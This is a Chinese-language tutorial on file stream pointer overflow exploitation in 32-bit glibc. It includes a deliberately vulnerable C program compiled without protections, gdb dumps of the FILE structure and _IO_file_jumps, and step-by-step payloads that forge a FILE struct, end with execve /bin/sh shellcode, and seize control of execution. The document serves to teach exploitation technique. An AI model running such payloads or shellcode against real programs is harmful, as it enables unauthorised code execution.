# Head First FILE Stream Pointer Overflow

0x00 前言
=======

* * *

哄完女票睡觉后，自己辗转反侧许久还是睡不着，干脆爬起来写一下文件流指针（我这里简称 FSP）溢出攻击的笔记。FSP 溢出和栈溢出同样古老，但是 paper 却很少，我翻遍 Google 只发现三四篇文章，都会附在最后的 Reference 里面，学习学习涨涨姿势。

本文先讲述 FSP 溢出攻击的原理，以及边构造边利用的方式攻击了一个示例程序。

另外，因为我接触 pwnable 时间不久，经验不足，基础不牢，如果有错误的地方或理解失误的地方还请指出。

0x01 介绍
=======

* * *

许多种不安全的代码组合可以造成 FSP 溢出，比较明显的几种组合方式是：`strcpy() ,strcat() ,read() , ....`和`vfprintf(), fprintf(), fputc(), fputs()`的组合。

FSP 溢出攻击通常是用户输入数据覆盖了文件流指针，导致我们可控文件流指针指向的 FILE 结构体（FILE struct）。FILE 结构体具体定义可以看[这里](https://sourceware.org/git/?p=glibc.git;a=blob;f=libio/libio.h;h=bebc112a3bffc800cddbbd885663c2b3a33c1324;hb=4f2b767fef50f5f5c356c0c0e424fccc893a4ae6#l273)，在此不再赘述。

控制了文件流指针后，可以构造合法的 FILE 结构体，最终在系统跳转至`_IO_file_jumps`的时候跳转到我们控制的地址，以控制 eip。

这张图是 FILE 结构体的构成图。

![p1](http://drops.javaweb.org/uploads/images/af1573b2bf6de04270b3939dcb3b1a0e75ea4a75.jpg)

图片来源：[https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/](https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/)

下面分析一下一个常见的 FILE 结构体构成。

```
gdb-peda$ x/40a stderr
0xf7fbb980: 0xfbad2086  0x0 0x0 0x0
0xf7fbb990: 0x0 0x0 0x0 0x0
0xf7fbb9a0: 0x0 0x0 0x0 0x0
0xf7fbb9b0: 0x0 0xf7fbba20  0x2 0x0
0xf7fbb9c0: 0xffffffff  0x0 0xf7fbc8ac  0xffffffff
0xf7fbb9d0: 0xffffffff  0x0 0xf7fbbb60  0x0
0xf7fbb9e0: 0x0 0x0 0x0 0x0
0xf7fbb9f0: 0x0 0x0 0x0 0x0
0xf7fbba00: 0x0 0x0 0x0 0x0
0xf7fbba10: 0x0 0xf7fbaa80 <_IO_file_jumps>  0x0 0x0

```

这是 stderr 的 FILE 结构体，`_IO_file_jumps`的地址是`0xf7fbaa80`。

```
gdb-peda$ x/21a 0xf7fbaa80
0xf7fbaa80 <_IO_file_jumps>:    0x0 0x0 0xf7e86a70  0xf7e873e0
0xf7fbaa90 <_IO_file_jumps+16>: 0xf7e871b0  0xf7e884d0  0xf7e89360  0xf7e86670
0xf7fbaaa0 <_IO_file_jumps+32>: 0xf7e876c0  0xf7e85d00  0xf7e887a0  0xf7e863a0
0xf7fbaab0 <_IO_file_jumps+48>: 0xf7e862b0  0xf7e7a1e0  0xf7e87610  0xf7e85c00
0xf7fbaac0 <_IO_file_jumps+64>: 0xf7e87650  0xf7e85c90  0xf7e87690  0xf7e89500
0xf7fbaad0 <_IO_file_jumps+80>: 0xf7e89510

```

这就是`_IO_file_jumps`储存的要跳转到函数的地址了，比如：

```
gdb-peda$ x/i 0xf7e86670
   0xf7e86670 <_IO_file_xsputn>:    sub    esp,0x3c

```

这个地址就是函数`_IO_file_xsputn`的地址。

0x02 利用
=======

* * *

大概聪明的你也应该想到利用方法了，我们能控制 FILE 指针的地址，那我们就可以自己构造一个假的 FILE struct，当然`_IO_file_jumps`也可以轻易的伪造。当各种文件处理函数跑到`_IO_file_jumps`寻找接下来该跳转的地址的时候，去我们伪造的`_IO_file_jumps`寻找指针，那么我们就可以控制 eip 执行 shellcode 了。

首先我们看一个示例程序（from:[http://repo.hackerzvoice.net/depot_ouah/fsp-overflows.txt](http://repo.hackerzvoice.net/depot_ouah/fsp-overflows.txt)）：

```
/*
 * file stream pointer overflow vulnerable program.c
 * -killah
 */
#include <stdio.h>
#include <string.h>

int main(int argc,char **argv)
{
   FILE *test;
   char msg[]="no segfault yet\n";
   char stage[1024];
   if(argc<2) {
      printf("usage : %s <argument>\n",argv[0]);
      exit(-1);
   }
   test=fopen("temp","a");
   strcpy(stage,argv[1]);
   fprintf(test,"%s",msg);
   exit(0);
}

```

可以看到先用了 strcpy，再用了 fprintf，很经典的组合方式。

编译：

```
cc -o fsp fsp.c -m32 -zexecstack -fno-stack-protector

```

大概由于优化的原因，我这里 fprintf 被优化成了 fputs，不过没差，一样可以利用。

利用的第一步先寻找到溢出的偏移。

当我用`r $(python -c "print 'a'*1041 + 'AAAA'")`跑的时候，可以控制 ESI。

![p2](http://drops.javaweb.org/uploads/images/cfb3060d3f789c6d67dac9b925132f8b77394b80.jpg)

如图，ESI 已经被控制成 0x41414141，那么这里就是我们控制的文件指针了。我们把整个文件结构体放在栈上， AAAA 的前面 160 个字节。AAAA 也改成指向文件指针开头的地方。

```
gdb-peda$ searchmem AAAA
Searching for 'AAAA' in: None ranges
Found 3 results, display max 3 items:
[stack] : 0xffffd364 ("AAAAR\345td]V\376\367\257\213", <incomplete sequence \342>...)
[stack] : 0xffffd78c ("AAAA")
[stack] : 0xffffdd95 ("AAAA")

```

当前 AAAA 的地址为 0xffffd78c，减去 160 个字节后就是 0xffffd6ec。那么构造 payload：

```
r $(python -c "print 'a'*881 + 'B'*160 + '\xec\xd6\xff\xff'")

```

![p3](http://drops.javaweb.org/uploads/images/1266a86e78c8e6dab11cff40caac7b1365196684.jpg)

报了新的错？没关系，take it easy，现在就开始构造 FILE struct 了。

我们知道 stderr 是一个标准的 FILE 结构体，那我们直接拿它的，在它的基础上改成我们需要的就好了。

```
gdb-peda$ x/160bx stderr
0xf7fbb980: 0x86    0x20    0xad    0xfb    0x00    0x00    0x00    0x00
0xf7fbb988: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xf7fbb990: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xf7fbb998: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xf7fbb9a0: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xf7fbb9a8: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xf7fbb9b0: 0x00    0x00    0x00    0x00    0x20    0xba    0xfb    0xf7
0xf7fbb9b8: 0x02    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xf7fbb9c0: 0xff    0xff    0xff    0xff    0x00    0x00    0x00    0x00
0xf7fbb9c8: 0xac    0xc8    0xfb    0xf7    0xff    0xff    0xff    0xff
0xf7fbb9d0: 0xff    0xff    0xff    0xff    0x00    0x00    0x00    0x00
0xf7fbb9d8: 0x60    0xbb    0xfb    0xf7    0x00    0x00    0x00    0x00
0xf7fbb9e0: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xf7fbb9e8: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xf7fbb9f0: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xf7fbb9f8: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xf7fbba00: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xf7fbba08: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xf7fbba10: 0x00    0x00    0x00    0x00    0x80    0xaa    0xfb    0xf7
0xf7fbba18: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00

```

经过处理后的到这么一长串：

```
\x86\x20\xad\xfb\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xba\xfb\xf7\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00\xac\xc8\xfb\xf7\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x60\xbb\xfb\xf7\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\xaa\xfb\xf7\x00\x00\x00\x00\x00\x00\x00\x00

```

但是我们知道，由于 strcpy 的缘故，并不能容忍 \x00 的存在，我们直接替换成 A 就好了，因为没报错..XD

```
r "`python -c "print 'a'*881 + '\x86\x20\xad\xfbAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x20\xba\xfb\xf7\x02AAAAAAA\xff\xff\xff\xffAAAA\xac\xc8\xfb\xf7\xff\xff\xff\xff\xff\xff\xff\xffAAAA\x60\xbb\xfb\xf7AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x80\xaa\xfb\xf7AAAAAAAA' + '\xec\xd6\xff\xff'"`"

```

拿去跑一下，看看有什么问题没有。

![p4](http://drops.javaweb.org/uploads/images/84c836bac40c3dac6b09b96a0515b61ce935d4ce.jpg)

快看快看，我们到了最后 call 的地方了。

也就是说，程序运行到要从`_IO_file_jumps`取出指针，然后跳转了。但是遇到了一些小问题， eax 不符合预期。看一下上下文的汇编代码。

```
0xf7e7b239 <fputs+153>: movzx  edx,BYTE PTR [esi+0x46]
0xf7e7b23d <fputs+157>: movsx  edx,dl
0xf7e7b240 <fputs+160>: mov    eax,DWORD PTR [esi+edx*1+0x94]
0xf7e7b247 <fputs+167>: mov    DWORD PTR [esp+0x8],edi
0xf7e7b24b <fputs+171>: mov    DWORD PTR [esp+0x4],ebp
0xf7e7b24f <fputs+175>: mov    DWORD PTR [esp],esi
0xf7e7b252 <fputs+178>: call   DWORD PTR [eax+0x1c]

```

edx 是从 esi+0x46 处得来的一个字节的值，eax 是 esi+edx+0x94 处的值，最后 call eax+0x1c。

大体先看一下 esi+0x94 的样子：

```
gdb-peda$ x/10w $esi+0x94
0xffffd780: 0xf7fbaa80  0x41414141  0x41414141  0xffffd6ec
0xffffd790: 0x08048500  0x00000000  0x00000000  0xf7e2f4d3
0xffffd7a0: 0x00000002  0xffffd834

```

0xffffd6ec 是我们控制的 FILE 结构体的地址，剩下的两处 0x41414141 正好可以用来写一些值来控制 eax。当 edx 为 0x4~0x8 的时候，正好在这 8 个字节的 0x41 的范围内。

我们让 esi+0x46 处为 8，然后第二处 0x41414141 指向 FILE 结构体前面的一块内存。

```
r "`python -c "print 'a'*881 + '\x86\x20\xad\xfbAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x20\xba\xfb\xf7\x02AAAAAAA\xff\xff\xff\xffAA\x08A\xac\xc8\xfb\xf7\xff\xff\xff\xff\xff\xff\xff\xffAAAA\x60\xbb\xfb\xf7AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x80\xaa\xfb\xf7AAAA\xae\xd6\xff\xff' + '\xec\xd6\xff\xff'"`"

```

我这里指向了 0xffffd63e 处，加上 0x1c 后（看上面汇编），为 0xffffd6ca。

![p5](http://drops.javaweb.org/uploads/images/fc417f48f72bd9acf6e2f1b48d0ab7c177076160.jpg)

已经可以控制 eip 了，我们修改一下 0xffffd6ca 处的地址，使其指向 0xffffd6cf，然后 0xffffd6ce-0xffffd6ec 这 30 个字节上放上 shellcode。注意 shellcode 应该正好为 30 个字节，不能多也不能少，少了的话用`\x90`补充（根据实际情况来就好了）。

最终 payload：

```
r "`python -c "print 'a'*847 + '\xcf\xd6\xff\xff' + '\x90'*9 + '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + '\x86\x20\xad\xfbAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x20\xba\xfb\xf7\x02AAAAAAA\xff\xff\xff\xffAA\x08A\xac\xc8\xfb\xf7\xff\xff\xff\xff\xff\xff\xff\xffAAAA\x60\xbb\xfb\xf7AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x80\xaa\xfb\xf7AAAA\xae\xd6\xff\xff' + '\xec\xd6\xff\xff'"`"

```

执行效果：![p6](http://drops.javaweb.org/uploads/images/f074b6900d521833ad04c9e6a408763a35ca6ade.jpg)

0x03 参考
=======

* * *

*   [File Stream Pointer Overflows Paper](http://repo.hackerzvoice.net/depot_ouah/fsp-overflows.txt)
*   [abusing the FILE structure](https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/)
*   [BUFFER OVERFLOW EXPLOITATION](https://securimag.org/wp/news/buffer-overflow-exploitation/)